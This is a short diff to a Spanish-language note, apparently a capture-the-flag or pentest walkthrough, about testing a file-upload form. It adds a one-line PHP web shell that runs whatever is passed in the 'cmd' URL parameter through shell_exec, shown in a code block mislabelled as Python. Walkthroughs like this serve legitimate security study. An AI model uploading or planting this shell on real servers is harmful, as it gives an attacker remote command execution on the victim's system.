@@ -296,7 +296,10 @@ haciendo un uploads de un archivo aleatorio obtenemos información sobre donde s
 vamos a subir nuestro archivo para identificar si la pagina puede interpretarnos esto. 
 
 ```python
-
+<?php
+ echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+ ?>
 ```
 
 ![[Pasted image 20240724151934.png]]
+
